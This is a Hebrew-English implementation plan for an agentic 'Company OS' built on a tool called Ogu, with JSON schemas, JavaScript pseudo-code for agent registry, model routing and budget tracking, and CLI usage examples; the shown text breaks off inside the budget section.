# Agentic Company OS — תוכנית מימוש מפורטת

> מערכת הפעלה לחברת טכנולוגיה אג'נטית: Local-first, model-agnostic, deterministic, auditable.
> נבנית **מתוך Ogu החוצה** — לא מאפס.

---

## תוכן עניינים

- [עקרון מנחה: גדילה מ-Ogu](#עקרון-מנחה-גדילה-מ-ogu)
- [מפת תלויות בין פאזות](#מפת-תלויות-בין-פאזות)
- [Phase 0: OrgSpec & Agent Registry](#phase-0-orgspec--agent-registry)
- [Phase 1: Model Router](#phase-1-model-router)
- [Phase 2: Budget System](#phase-2-budget-system)
- [Phase 3: Audit Trail](#phase-3-audit-trail)
- [Phase 4: Governance Engine](#phase-4-governance-engine)
- [Phase 5: Kadima — Organization OS](#phase-5-kadima--organization-os)
- [Phase 6: Multi-Agent Runtime](#phase-6-multi-agent-runtime)
- [Cross-Cutting: 8 חוזים מבניים](#cross-cutting-8-חוזים-מבניים)
  - [Fix 1: Kadima ↔ Ogu Contract](#fix-1-kadima--ogu-contract)
  - [Fix 2: Global Feature State Machine](#fix-2-global-feature-state-machine)
  - [Fix 3: Execution Snapshot Layer](#fix-3-execution-snapshot-layer-determinism-אמיתי)
  - [Fix 4: Resource Governor](#fix-4-resource-governor)
  - [Fix 5: Formal Override Handling](#fix-5-formal-override-handling)
  - [Fix 6: Capability Registry](#fix-6-capability-registry-הפרדת-capability-מ-provider)
  - [Fix 7: Agent Performance Index](#fix-7-agent-performance-index-learning-loop-ארגוני)
  - [Fix 8: Sandbox Policy Spec](#fix-8-sandbox-policy-spec)
- [נספח: מיפוי Vision → Implementation](#נספח-מיפוי-vision--implementation)
- [Iteration 4: Formal Hardening — ל-13 אמיתי](#iteration-4-formal-hardening--ל-13-אמיתי)
  - [Closure 1: Policy AST & Deterministic Evaluation Pipeline](#closure-1-policy-ast--deterministic-evaluation-pipeline)
  - [Closure 2: Feature Lifecycle — Full Formal State Machine](#closure-2-feature-lifecycle--full-formal-state-machine)
  - [Closure 3: Feature Isolation Model](#closure-3-feature-isolation-model)
  - [Closure 4: Agent Identity Contract](#closure-4-agent-identity-contract)
  - [Enhancement 1: KadimaAdapter.contract — Strict Boundary Enforcement](#enhancement-1-kadimaadaptercontract--strict-boundary-enforcement)
  - [Enhancement 2: Company Snapshot — Full Org Replay](#enhancement-2-company-snapshot--full-org-replay)
  - [Enhancement 3: Failure Simulation Mode — Chaos Injection](#enhancement-3-failure-simulation-mode--chaos-injection)
- [Iteration 5: OS Guarantees — ל-13 מושלם](#iteration-5-os-guarantees--ל-13-מושלם)
  - [Closure 5: Formal Consistency Model — Transaction Boundaries](#closure-5-formal-consistency-model--transaction-boundaries)
  - [Closure 6: Formal Scheduling Policy](#closure-6-formal-scheduling-policy)
  - [Closure 7: Failure Domains & Resilience Strategy](#closure-7-failure-domains--resilience-strategy)
  - [Closure 8: Formal Metrics Layer — Org Health Score](#closure-8-formal-metrics-layer--org-health-score)
  - [Enhancement 4: Execution Graph Hash](#enhancement-4-execution-graph-hash)
  - [Enhancement 5: Deterministic Mode Flag](#enhancement-5-deterministic-mode-flag)
  - [Enhancement 6: Company Freeze](#enhancement-6-company-freeze)
- [Iteration 6: The Absolute Horizon — חסינת-מציאות](#iteration-6-the-absolute-horizon--חסינת-מציאות)
  - [Closure 9: Semantic Mutex & AST Merging](#closure-9-semantic-mutex--ast-merging)
  - [Closure 10: Semantic Memory Fabric — The Corporate Brain](#closure-10-semantic-memory-fabric--the-corporate-brain)
  - [Closure 11: Functional Determinism Tolerance](#closure-11-functional-determinism-tolerance)
  - [Closure 12: MicroVM Execution Matrix](#closure-12-microvm-execution-matrix)
- [Iteration 7: Physical Architecture — מלוגיקה לסרביסים](#iteration-7-physical-architecture--מלוגיקה-לסרביסים)
  - [Topology 1: Service Map — 3 Daemons + CLI](#topology-1-service-map--3-daemons--cli)
  - [Topology 2: Persistence Layer — Local-First Storage](#topology-2-persistence-layer--local-first-storage)
  - [Topology 3: IPC Protocol — Service Communication](#topology-3-ipc-protocol--service-communication)
  - [Topology 4: Process Lifecycle — Startup, Health, Shutdown](#topology-4-process-lifecycle--startup-health-shutdown)
  - [Topology 5: Task Lifecycle — End-to-End Flow](#topology-5-task-lifecycle--end-to-end-flow)
  - [Milestone 1: Monolithic CLI (חודשים 1-2)](#milestone-1-monolithic-cli-חודשים-1-2)
  - [Milestone 2: Kadima Daemon (חודשים 3-4)](#milestone-2-kadima-daemon-חודשים-3-4)
  - [Milestone 3: Distributed Runners (חודשים 5-6)](#milestone-3-distributed-runners-חודשים-5-6)
  - [Directory Layout: Physical Monorepo](#directory-layout-physical-monorepo)
  - [Bootstrap Sequence: Day One](#bootstrap-sequence-day-one)

---

## עקרון מנחה: גדילה מ-Ogu

Ogu כבר מכיל גרסאות עובריות של רוב הקונספטים:

| קונספט ב-Vision | קיים ב-Ogu | מיקום | מה חסר |
|---|---|---|---|
| Agents | 20 Skills | `.claude/skills/` | Identity model, registry, routing |
| Workflow DAG | Orchestrate | `commands/orchestrate.mjs` | Agent assignment, budget constraints |
| Gate Engine | 14 Gates | `commands/gates.mjs` | Escalation policy, agent-aware |
| Budget | Context budget (P1-P4) | `commands/context.mjs` | Token tracking, cost per agent |
| Audit | Daily logs | `.ogu/memory/` | Structured events, reproducibility |
| Governance | Invariants + Contracts | `docs/vault/` | Executable policies, approval flow |
| Model Router | Hardcoded 3 models | `studio/server/api/chat.ts` | Dynamic routing, multi-provider |
| Memory | 3-layer memory | remember/learn/recall | Agent-scoped memory |
| Determinism | Context lock + hash chain | `commands/context-lock.mjs` | Full replay, non-det logging |
| Organization | Single-user | `STATE.json` | OrgSpec, roles, team |

**הכלל: לא בונים דבר חדש לפני שמוצים את מה שכבר קיים.**

---

## מפת תלויות בין פאזות

```
Phase 0: OrgSpec & Agent Registry
    │
    ├──→ Phase 1: Model Router
    │       │
    │       └──→ Phase 2: Budget System
    │               │
    │               └──→ Phase 3: Audit Trail
    │                       │
    │                       ├──→ Phase 4: Governance Engine
    │                       │
    │                       └──→ Phase 5: Kadima (Organization OS)
    │                               │
    │                               └──→ Phase 6: Multi-Agent Runtime
    │
    └──→ Phase 3: Audit Trail (partial — basic logging)
```

Phase 0 הוא prerequisite לכל השאר.
Phase 3 (audit בסיסי) יכול להתחיל במקביל ל-Phase 1.
Phase 4 ו-5 תלויים ב-3.
Phase 6 תלוי בכל מה שלפניו.

---

## Phase 0: OrgSpec & Agent Registry

### מטרה
להגדיר את השפה הפורמלית של הארגון — מי הסוכנים, מה התפקידים, מה ההרשאות — ולחלץ את המידע הזה מתוך Skills הקיימים.

### קבצים חדשים

```
.ogu/OrgSpec.json                          ← הגדרת הארגון
.ogu/agents/                               ← תיקיית agent state
.ogu/agents/{roleId}.state.json            ← state פר agent
tools/ogu/commands/org.mjs                 ← CLI: org:init, org:show, org:validate
tools/ogu/commands/agent.mjs               ← CLI: agent:list, agent:show, agent:create
tools/ogu/commands/lib/agent-registry.mjs  ← Agent loading, validation, matching
docs/vault/02_Contracts/OrgSpec.contract.md ← Contract for OrgSpec format
```

### Schema: OrgSpec.json

```json
{
  "$schema": "OrgSpec/1.0",
  "org": {
    "name": "string — project/company name",
    "version": "semver",
    "created": "ISO timestamp",
    "owner": "string — human owner identifier"
  },
  "roles": [
    {
      "roleId": "pm",
      "title": "Product Manager",
      "description": "Defines product requirements and specifications",
      "ownershipScope": ["docs/vault/04_Features/*/PRD.md", "docs/vault/04_Features/*/QA.md"],
      "allowedTools": ["Read", "Write", "Glob", "Grep", "WebSearch", "WebFetch"],
      "allowedCommands": ["feature:create", "feature:validate --phase-1"],
      "blockedCommands": ["compile", "gates"],
      "riskTier": "low",
      "modelPolicy": {
        "default": "sonnet",
        "maxTier": "sonnet",
        "escalationEnabled": false
      },
      "budgetQuota": {
        "dailyTokens": 500000,
        "maxCostPerTask": 2.00,
        "currency": "USD"
      },
      "escalationPath": ["tech-lead", "cto"],
      "memoryScope": {
        "read": ["vault/04_Features/*", ".ogu/MEMORY.md", ".ogu/SESSION.md"],
        "write": ["vault/04_Features/*/PRD.md", "vault/04_Features/*/QA.md"]
      },
      "phases": ["idea", "feature"],
      "sourceSkill": "feature"
    }
  ],
  "defaults": {
    "modelPolicy": {
      "default": "sonnet",
      "maxTier": "opus",
      "escalationEnabled": true,
      "escalationThreshold": 3,
      "escalationChain": ["haiku", "sonnet", "opus"]
    },
    "budgetQuota": {
      "dailyTokens": 1000000,
      "maxCostPerTask": 5.00
    },
    "riskTier": "medium"
  },
  "teams": [
    {
      "teamId": "product",
      "name": "Product Team",
      "roles": ["pm", "designer"],
      "lead": "pm"
    },
    {
      "teamId": "engineering",
      "name": "Engineering Team",
      "roles": ["architect", "backend-dev", "frontend-dev", "devops"],
      "lead": "architect"
    },
    {
      "teamId": "quality",
      "name": "Quality Team",
      "roles": ["qa", "security"],
      "lead": "qa"
    }
  ]
}
```

### Pre-built Roles (חילוץ מ-Skills קיימים)

| roleId | Source Skill | Phases | Risk Tier | Default Model |
|---|---|---|---|---|
| `pm` | `/idea`, `/feature` | idea, feature | low | sonnet |
| `architect` | `/architect` | architect | medium | opus |
| `designer` | `/design`, `/reference` | design | low | sonnet |
| `backend-dev` | `/build` | build | medium | sonnet |
| `frontend-dev` | `/build` | build | medium | sonnet |
| `qa` | `/smoke`, `/verify-ui`, `/vision` | verify | medium | sonnet |
| `security` | `/enforce` | enforce | high | opus |
| `devops` | `/preview`, `/observe` | preview, observe | high | opus |
| `tech-lead` | `/done`, `/pipeline` | done, pipeline | high | opus |
| `cto` | — (escalation target) | governance | critical | opus |

### Pseudo-code: agent-registry.mjs

```javascript
// tools/ogu/commands/lib/agent-registry.mjs

import { readJsonSafe, repoRoot } from '../../util.mjs';
import { join } from 'path';

const ORGSPEC_PATH = '.ogu/OrgSpec.json';
const AGENT_STATE_DIR = '.ogu/agents';

/**
 * Load and validate OrgSpec
 */
export function loadOrgSpec(root = repoRoot()) {
  const spec = readJsonSafe(join(root, ORGSPEC_PATH));
  if (!spec || !spec.roles) throw new Error('OGU2001: OrgSpec missing or invalid');
  validateOrgSpec(spec);
  return spec;
}

/**
 * Validate OrgSpec integrity
 * - No duplicate roleIds
 * - All escalation paths reference valid roles
 * - All team roles exist
 * - Budget quotas are positive
 */
export function validateOrgSpec(spec) {
  const roleIds = new Set();
  const errors = [];

  for (const role of spec.roles) {
    if (roleIds.has(role.roleId)) {
      errors.push(`OGU2002: Duplicate roleId: ${role.roleId}`);
    }
    roleIds.add(role.roleId);

    for (const target of role.escalationPath || []) {
      if (!spec.roles.some(r => r.roleId === target)) {
        errors.push(`OGU2003: Escalation target '${target}' not found for role '${role.roleId}'`);
      }
    }

    if (role.budgetQuota?.dailyTokens <= 0) {
      errors.push(`OGU2004: Invalid budget for '${role.roleId}'`);
    }
  }

  for (const team of spec.teams || []) {
    for (const roleId of team.roles) {
      if (!roleIds.has(roleId)) {
        errors.push(`OGU2005: Team '${team.teamId}' references unknown role '${roleId}'`);
      }
    }
  }

  if (errors.length > 0) throw new Error(errors.join('\n'));
  return true;
}

/**
 * Find the best agent role for a given phase and task
 */
export function matchRole(spec, { phase, riskTier, taskType }) {
  const candidates = spec.roles.filter(r =>
    r.phases.includes(phase) &&
    riskTierLevel(r.riskTier) >= riskTierLevel(riskTier || 'low')
  );

  if (candidates.length === 0) {
    // Fallback to defaults
    return { roleId: '_default', ...spec.defaults };
  }

  // Prefer exact phase match, then lowest sufficient risk tier
  return candidates.sort((a, b) =>
    riskTierLevel(a.riskTier) - riskTierLevel(b.riskTier)
  )[0];
}

/**
 * Load agent state (tokens used today, tasks completed, failures)
 */
export function loadAgentState(root, roleId) {
  const path = join(root, AGENT_STATE_DIR, `${roleId}.state.json`);
  return readJsonSafe(path) || {
    roleId,
    date: new Date().toISOString().split('T')[0],
    tokensUsedToday: 0,
    costToday: 0,
    tasksCompleted: 0,
    tasksFailed: 0,
    escalations: 0,
    lastAction: null
  };
}

function riskTierLevel(tier) {
  return { low: 1, medium: 2, high: 3, critical: 4 }[tier] || 2;
}
```

### CLI Commands

**`ogu org:init`**
```
Usage: ogu org:init [--from-skills]

Flags:
  --from-skills    Auto-generate OrgSpec from existing .claude/skills/

Output: Creates .ogu/OrgSpec.json with role definitions extracted from skills.
        Creates .ogu/agents/ directory.

Example:
  $ ogu org:init --from-skills
  ✓ Scanned 20 skills
  ✓ Generated 10 roles: pm, architect, designer, backend-dev, frontend-dev, qa, security, devops, tech-lead, cto
  ✓ Created 3 teams: product, engineering, quality
  ✓ Wrote .ogu/OrgSpec.json
  ✓ Created .ogu/agents/
```

**`ogu org:show`**
```
Usage: ogu org:show [--json]

Output: Formatted org chart with roles, teams, budgets, model policies.

Example:
  $ ogu org:show
  Organization: My App (v1.0.0)

  ┌─ Product Team (lead: pm)
  │  pm         │ sonnet │ 500K tokens/day │ $2/task │ low risk
  │  designer   │ sonnet │ 500K tokens/day │ $2/task │ low risk
  │
  ├─ Engineering Team (lead: architect)
  │  architect  │ opus   │ 2M tokens/day   │ $10/task │ medium risk
  │  backend    │ sonnet │ 1M tokens/day   │ $5/task  │ medium risk
  │  frontend   │ sonnet │ 1M tokens/day   │ $5/task  │ medium risk
  │  devops     │ opus   │ 500K tokens/day │ $5/task  │ high risk
  │
  └─ Quality Team (lead: qa)
     qa         │ sonnet │ 1M tokens/day   │ $5/task  │ medium risk
     security   │ opus   │ 500K tokens/day │ $5/task  │ high risk
```

**`ogu org:validate`**
```
Usage: ogu org:validate

Output: Validates OrgSpec.json against contract.
        Checks: duplicate roles, valid escalation paths, budget sanity, team integrity.
```

**`ogu agent:list`**
```
Usage: ogu agent:list [--with-state]

Output:
  $ ogu agent:list --with-state
  ROLE         MODEL    TOKENS TODAY   COST    TASKS   FAILURES
  pm           sonnet   123,456        $0.32   4       0
  architect    opus     890,123        $4.50   2       1
  backend-dev  sonnet   456,789        $1.20   8       0
  ...
```

### Studio Integration

**API Endpoints:**
```
GET  /api/org              → Returns OrgSpec.json
POST /api/org/init         → Runs org:init
GET  /api/agents           → Returns all agent states
GET  /api/agents/:roleId   → Returns specific agent state
```

**WebSocket Events:**
```
org:changed    → When OrgSpec.json is modified
agent:updated  → When agent state changes (task completed, tokens used)
```

**UI Component: Org Dashboard**
- Org chart visualization (tree layout)
- Per-role status cards (tokens used, tasks, failures)
- Team grouping with expandable sections
- Click role → shows agent detail (allowedTools, memory scope, budget)

### אימות (Verification)

1. `ogu org:init --from-skills` creates valid OrgSpec from existing 20 skills
2. `ogu org:validate` passes with no errors
3. `ogu agent:list` shows all roles with initial state
4. Studio `/api/org` returns valid JSON
5. All 10 pre-built roles map correctly to existing skills

---

## Phase 1: Model Router

### מטרה
להפשיט את בחירת המודל מ-hardcoded (3 מודלים ב-chat.ts) לשכבת routing דינמית שמבוססת על תפקיד, סיכון, תקציב, והיסטוריית כשלונות.

### קבצים חדשים

```
tools/ogu/commands/lib/model-router.mjs    ← Routing logic
tools/ogu/commands/model.mjs               ← CLI: model:route, model:status, model:providers
.ogu/model-config.json                     ← Provider configuration
.ogu/model-log.jsonl                       ← Decision log (append-only)
```

### קבצים לעדכון

```
tools/studio/server/api/chat.ts            ← Replace hardcoded model with router call
```

### Schema: model-config.json

```json
{
  "$schema": "ModelConfig/1.0",
  "providers": [
    {
      "id": "anthropic",
      "name": "Anthropic",
      "enabled": true,
      "models": [
        {
          "id": "haiku",
          "fullId": "claude-haiku-4-5-20251001",
          "tier": 1,
          "costPer1kInput": 0.001,
          "costPer1kOutput": 0.005,
          "maxTokens": 200000,
          "latencyMs": 500,
          "capabilities": ["fast", "simple-tasks", "classification"]
        },
        {
          "id": "sonnet",
          "fullId": "claude-sonnet-4-6-20250514",
          "tier": 2,
          "costPer1kInput": 0.003,
          "costPer1kOutput": 0.015,
          "maxTokens": 200000,
          "latencyMs": 1500,
          "capabilities": ["coding", "analysis", "general"]
        },
        {
          "id": "opus",
          "fullId": "claude-opus-4-6-20250514",
          "tier": 3,
          "costPer1kInput": 0.015,
          "costPer1kOutput": 0.075,
          "maxTokens": 200000,
          "latencyMs": 3000,
          "capabilities": ["complex-reasoning", "architecture", "security-review"]
        }
      ],
      "apiKeyEnv": "ANTHROPIC_API_KEY"
    },
    {
      "id": "openai",
      "name": "OpenAI",
      "enabled": false,
      "models": [],
      "apiKeyEnv": "OPENAI_API_KEY"
    }
  ],
  "routingPolicies": {
    "cost-optimized": {
      "description": "Always pick cheapest model that can handle the task",
      "preferTier": 1,
      "escalateOnFailure": true,
      "maxEscalations": 2
    },
    "quality-first": {
      "description": "Always pick highest tier within budget",
      "preferTier": 3,
      "escalateOnFailure": false,
      "maxEscalations": 0
    },
    "balanced": {
      "description": "Start at role default, escalate on failure",
      "preferTier": null,
      "escalateOnFailure": true,
      "maxEscalations": 2
    }
  },
  "activePolicy": "balanced"
}
```

### Schema: model-log.jsonl (שורה אחת)

```json
{
  "timestamp": "ISO",
  "roleId": "backend-dev",
  "taskId": "task-3",
  "phase": "build",
  "riskTier": "medium",
  "requestedModel": null,
  "selectedModel": "sonnet",
  "selectedProvider": "anthropic",
  "reason": "role-default",
  "budgetRemaining": 876543,
  "failureCount": 0,
  "escalatedFrom": null
}
```

### Pseudo-code: model-router.mjs

```javascript
// tools/ogu/commands/lib/model-router.mjs

import { readJsonSafe, repoRoot } from '../../util.mjs';
import { loadOrgSpec, loadAgentState } from './agent-registry.mjs';
import { appendFileSync } from 'fs';
import { join } from 'path';

const CONFIG_PATH = '.ogu/model-config.json';
const LOG_PATH = '.ogu/model-log.jsonl';

/**
 * Route a model selection decision
 *
 * @param {Object} input
 * @param {string} input.roleId - Agent role requesting the model
 * @param {string} input.phase - Current pipeline phase
 * @param {string} input.taskId - Task identifier (for logging)
 * @param {number} input.failureCount - How many times this task has failed
 * @param {string} [input.requestedModel] - Explicit model request (override)
 * @param {string} [input.riskTier] - Override risk tier
 *
 * @returns {{ provider: string, model: string, fullModelId: string, retryPolicy: Object }}
 */
export function routeModel(input) {
  const root = repoRoot();
  const config = loadModelConfig(root);
  const orgSpec = loadOrgSpec(root);
  const agentState = loadAgentState(root, input.roleId);

  // Step 1: If explicit model requested, validate and use
  if (input.requestedModel) {
    const resolved = resolveExplicitModel(config, input.requestedModel);
    if (resolved) {
      logDecision(root, { ...input, ...resolved, reason: 'explicit-request' });
      return resolved;
    }
  }

  // Step 2: Get role's model policy
  const role = orgSpec.roles.find(r => r.roleId === input.roleId);
  const policy = role?.modelPolicy || orgSpec.defaults.modelPolicy;
  const routingPolicy = config.routingPolicies[config.activePolicy];

  // Step 3: Check if escalation needed
  let targetTier = policy.default
    ? tierForModel(config, policy.default)
    : (routingPolicy.preferTier || 2);

  if (input.failureCount > 0 && policy.escalationEnabled !== false) {
    const chain = policy.escalationChain || orgSpec.defaults.modelPolicy.escalationChain;
    const escalationIndex = Math.min(input.failureCount, chain.length - 1);
    const escalatedModel = chain[escalationIndex];
    targetTier = Math.max(targetTier, tierForModel(config, escalatedModel));
  }

  // Step 4: Check budget constraints
  const budget = role?.budgetQuota || orgSpec.defaults.budgetQuota;
  if (agentState.tokensUsedToday >= budget.dailyTokens) {
    // Budget exhausted — downgrade to cheapest available
    targetTier = 1;
    // Log warning
  }

  // Step 5: Cap at maxTier
  const maxTier = tierForModel(config, policy.maxTier || 'opus');
  targetTier = Math.min(targetTier, maxTier);

  // Step 6: Find best available model at target tier
  const selected = findModelAtTier(config, targetTier);

  const result = {
    provider: selected.providerId,
    model: selected.model.id,
    fullModelId: selected.model.fullId,
    retryPolicy: {
      maxRetries: routingPolicy.maxEscalations,
      escalateOnFailure: routingPolicy.escalateOnFailure,
      backoffMs: 1000
    }
  };

  logDecision(root, {
    ...input,
    selectedModel: result.model,
    selectedProvider: result.provider,
    reason: input.failureCount > 0 ? 'escalation' : 'role-default',
    budgetRemaining: budget.dailyTokens - agentState.tokensUsedToday,
    escalatedFrom: input.failureCount > 0 ? policy.default : null
  });

  return result;
}

/**
 * Get routing statistics from log
 */
export function routingStats(root, { days = 7 } = {}) {
  // Parse model-log.jsonl, aggregate by:
  // - model usage count
  // - escalation frequency
  // - cost per model
  // - failure-to-escalation ratio
}

function loadModelConfig(root) {
  const config = readJsonSafe(join(root, CONFIG_PATH));
  if (!config) throw new Error('OGU2101: model-config.json missing');
  return config;
}

function tierForModel(config, modelId) {
  for (const provider of config.providers) {
    const model = provider.models.find(m => m.id === modelId);
    if (model) return model.tier;
  }
  return 2; // default to mid-tier
}

function findModelAtTier(config, tier) {
  for (const provider of config.providers.filter(p => p.enabled)) {
    // Find closest model at or below target tier
    const candidates = provider.models
      .filter(m => m.tier <= tier)
      .sort((a, b) => b.tier - a.tier); // prefer highest tier within limit
    if (candidates.length > 0) {
      return { providerId: provider.id, model: candidates[0] };
    }
  }
  throw new Error('OGU2102: No available model for tier ' + tier);
}

function resolveExplicitModel(config, modelId) {
  for (const provider of config.providers.filter(p => p.enabled)) {
    const model = provider.models.find(m => m.id === modelId);
    if (model) {
      return { provider: provider.id, model: model.id, fullModelId: model.fullId };
    }
  }
  return null;
}

function logDecision(root, data) {
  const entry = { timestamp: new Date().toISOString(), ...data };
  appendFileSync(join(root, LOG_PATH), JSON.stringify(entry) + '\n');
}
```

### שינוי ב-chat.ts (Studio)

**לפני (hardcoded):**
```typescript
// chat.ts line ~280
const validModels = ['sonnet', 'opus', 'haiku'];
const selectedModel = validModels.includes(model) ? model : 'sonnet';
args.push('--model', selectedModel);
```

**אחרי (router-based):**
```typescript
// chat.ts — import router
import { routeModel } from '../../ogu/commands/lib/model-router.mjs';

// In chat handler:
const routingResult = routeModel({
  roleId: detectRoleFromPhase(currentPhase),
  phase: currentPhase,
  taskId: featureSlug || 'chat',
  failureCount: sessionFailureCount,
  requestedModel: body.model || null
});

args.push('--model', routingResult.model);

// Emit routing decision to client
sendEvent({ type: 'model_routed', ...routingResult });
```

### CLI Commands

**`ogu model:route`**
```
Usage: ogu model:route --role <roleId> --phase <phase> [--failures N]

Dry-run routing decision without executing.

Example:
  $ ogu model:route --role backend-dev --phase build --failures 2
  Provider:  anthropic
  Model:     opus (escalated from sonnet after 2 failures)
  Tier:      3
  Budget:    876,543 tokens remaining
  Policy:    balanced
```

**`ogu model:status`**
```
Usage: ogu model:status [--days N]

Show routing statistics.

Example:
  $ ogu model:status --days 7
  MODEL USAGE (7 days):
  haiku    │ ████████████████████ 45%  │ 234 calls │ $0.47
  sonnet   │ █████████████        30%  │ 156 calls │ $2.34
  opus     │ ███████████          25%  │ 130 calls │ $9.75

  ESCALATIONS: 23 (4.4% of calls)
  haiku→sonnet: 15  │  sonnet→opus: 8

  TOTAL COST: $12.56
```

**`ogu model:providers`**
```
Usage: ogu model:providers

List configured providers and their status.

Example:
  $ ogu model:providers
  PROVIDER    STATUS    MODELS           API KEY
  anthropic   enabled   haiku,sonnet,opus   ✓ set
  openai      disabled  —                   ✗ missing
```

### Studio UI: Model Routing Panel

- Current model indicator in chat header (shows why this model was selected)
- Model override dropdown (user can force a specific model)
- Routing log viewer (shows decision chain for current session)
- Escalation indicator (flashes when model is escalated)

### אימות

1. `ogu model:route --role pm --phase feature` returns sonnet
2. `ogu model:route --role architect --phase architect` returns opus
3. `ogu model:route --role backend-dev --phase build --failures 3` returns opus (escalation)
4. Studio chat correctly uses router instead of hardcoded model
5. `model-log.jsonl` captures every routing decision
6. Budget-exhausted agent gets downgraded to haiku

---

## Phase 2: Budget System

### מטרה
מעקב אחרי עלויות בזמן אמת — כמה כל agent, כל feature, כל מודל עולה. אכיפת מגבלות תקציב. התראות כשקרובים לגבול.

### קבצים חדשים

```
.ogu/BUDGET.json                           ← Global budget state
.ogu/budget/                               ← Budget history directory
.ogu/budget/YYYY-MM-DD.jsonl               ← Daily spending log
tools/ogu/commands/budget.mjs              ← CLI: budget:status, budget:set, budget:report, budget:reset
tools/ogu/commands/lib/budget-tracker.mjs  ← Tracking logic, cost calculation
docs/vault/02_Contracts/Budget.contract.md ← Budget system contract
```

### קבצים לעדכון

```
tools/ogu/commands/lib/model-router.mjs    ← Query budget before routing
tools/ogu/commands/lib/agent-registry.mjs  ← Update agent state with costs
tools/studio/server/api/chat.ts            ← Extract token counts from Claude output, feed to tracker
```

### Schema: BUDGET.json

```json
{
  "$schema": "Budget/1.0",
  "global": {
    "dailyLimit": 50.00,
    "monthlyLimit": 1000.00,
    "currency": "USD",
    "alertThresholds": [0.50, 0.75, 0.90]
  },
  "today": {
    "date": "2026-02-27",
    "totalTokensIn": 1234567,
    "totalTokensOut": 456789,
    "totalCost": 12.56,
    "byRole": {
      "architect": { "tokensIn": 890123, "tokensOut": 234567, "cost": 8.50, "tasks": 2 },
      "backend-dev": { "tokensIn": 344444, "tokensOut": 222222, "cost": 4.06, "tasks": 5 }
    },
    "byModel": {
      "opus": { "tokensIn": 500000, "tokensOut": 200000, "cost": 9.00, "calls": 3 },
      "sonnet": { "tokensIn": 734567, "tokensOut": 256789, "cost": 3.56, "calls": 12 }
    },
    "byFeature": {
      "auth-system": { "tokensIn": 1000000, "tokensOut": 400000, "cost": 10.00 },
      "_chat": { "tokensIn": 234567, "tokensOut": 56789, "cost": 2.56 }
    }
  },
  "history": {
    "last7days": {
      "totalCost": 67.89,
      "avgDailyCost": 9.70,
      "peakDay": "2026-02-25",
      "peakCost": 18.50
    },
    "thisMonth": {
      "totalCost": 234.56,
      "daysRemaining": 1,
      "projectedMonthly": 242.00,
      "withinBudget": true
    }
  }
}
```

### Schema: Daily spending log (שורה אחת)

```json
{
  "timestamp": "ISO",
  "type": "model_call",
  "roleId": "backend-dev",
  "featureSlug": "auth-system",
  "taskId": "task-3",
  "model": "sonnet",
  "provider": "anthropic",
  "tokensIn": 12345,
  "tokensOut": 6789,
  "cost": 0.14,
  "durationMs": 3200,
  "success": true,
  "escalated": false
}
```

### Pseudo-code: budget-tracker.mjs

```javascript
// tools/ogu/commands/lib/budget-tracker.mjs

import { readJsonSafe, repoRoot } from '../../util.mjs';
import { writeFileSync, appendFileSync, mkdirSync } from 'fs';
import { join } from 'path';

const BUDGET_PATH = '.ogu/BUDGET.json';
const BUDGET_DIR = '.ogu/budget';

/**
 * Record a model call and update budget state
 */
export function recordSpend(root, {
  roleId, featureSlug, taskId, model, provider,
  tokensIn, tokensOut, durationMs, success, escalated
}) {
  const config = loadModelConfig(root);
  const modelDef = findModel(config, provider, model);
  const cost = calculateCost(modelDef, tokensIn, tokensOut);

  // 1. Append to daily log
  const today = new Date().toISOString().split('T')[0];
  mkdirSync(join(root, BUDGET_DIR), { recursive: true });
  const logPath = join(root, BUDGET_DIR, `${today}.jsonl`);
  appendFileSync(logPath, JSON.stringify({
    timestamp: new Date().toISOString(),
    type: 'model_call',
    roleId, featureSlug, taskId, model, provider,
    tokensIn, tokensOut, cost, durationMs, success, escalated
  }) + '\n');

  // 2. Update BUDGET.json aggregates
  const budget = loadBudget(root);
  ensureToday(budget, today);

  budget.today.totalTokensIn += tokensIn;
  budget.today.totalTokensOut += tokensOut;
  budget.today.totalCost += cost;

  // Aggregate by role
  const byRole = budget.today.byRole[roleId] ||= { tokensIn: 0, tokensOut: 0, cost: 0, tasks: 0 };
  byRole.tokensIn += tokensIn;
  byRole.tokensOut += tokensOut;
  byRole.cost += cost;

  // Aggregate by model
  const byModel = budget.today.byModel[model] ||= { tokensIn: 0, tokensOut: 0, cost: 0, calls: 0 };
  byModel.tokensIn += tokensIn;
  byModel.tokensOut += tokensOut;
  byModel.cost += cost;
  byModel.calls += 1;

  // Aggregate by feature
  const slug = featureSlug || '_chat';
  const byFeature = budget.today.byFeature[slug] ||= { tokensIn: 0, tokensOut: 0, cost: 0 };
  byFeature.tokensIn += tokensIn;
  byFeature.tokensOut += tokensOut;
  byFeature.cost += cost;

  writeBudget(root, budget);

  // 3. Check alerts
  return checkAlerts(budget);
}

/**
 * Check if budget limits are approaching or exceeded
 * Returns array of alert objects
 */
export function checkAlerts(budget) {
  const alerts = [];
  const { global, today, history } = budget;

  // Daily limit check
  for (const threshold of global.alertThresholds) {
    if (today.totalCost >= global.dailyLimit * threshold) {
      alerts.push({
        level: threshold >= 0.9 ? 'critical' : threshold >= 0.75 ? 'warning' : 'info',
        message: `Daily spend at ${Math.round(today.totalCost / global.dailyLimit * 100)}% ($${today.totalCost.toFixed(2)} / $${global.dailyLimit})`,
        type: 'daily_limit'
      });
    }
  }

  // Monthly projection check
  if (history?.thisMonth) {
    const projected = history.thisMonth.projectedMonthly;
    if (projected > global.monthlyLimit) {
      alerts.push({
        level: 'warning',
        message: `Monthly projection $${projected.toFixed(2)} exceeds limit $${global.monthlyLimit}`,
        type: 'monthly_projection'
      });
    }
  }

  return alerts;
}

/**
 * Check if a role has budget remaining
 */
export function hasBudget(root, roleId) {
  const budget = loadBudget(root);
  const orgSpec = loadOrgSpec(root);
  const role = orgSpec.roles.find(r => r.roleId === roleId);
  const quota = role?.budgetQuota || orgSpec.defaults.budgetQuota;
  const used = budget.today.byRole[roleId]?.tokensIn || 0;
  return used < quota.dailyTokens;
}

/**
 * Generate spending report
 */
export function generateReport(root, { days = 7 } = {}) {
  // Read last N days of .jsonl files
  // Aggregate into: by-role, by-model, by-feature, trends
  // Return structured report object
}

function calculateCost(modelDef, tokensIn, tokensOut) {
  return (tokensIn / 1000 * modelDef.costPer1kInput) +
         (tokensOut / 1000 * modelDef.costPer1kOutput);
}
```

### Token Extraction from Claude CLI (Studio)

```typescript
// In chat.ts — parse Claude CLI streaming output for usage info

// Claude CLI emits usage in stream-json format:
// {"type":"usage","input_tokens":1234,"output_tokens":567}

function parseUsageEvent(data) {
  if (data.type === 'usage' || data.type === 'result') {
    return {
      tokensIn: data.input_tokens || data.usage?.input_tokens || 0,
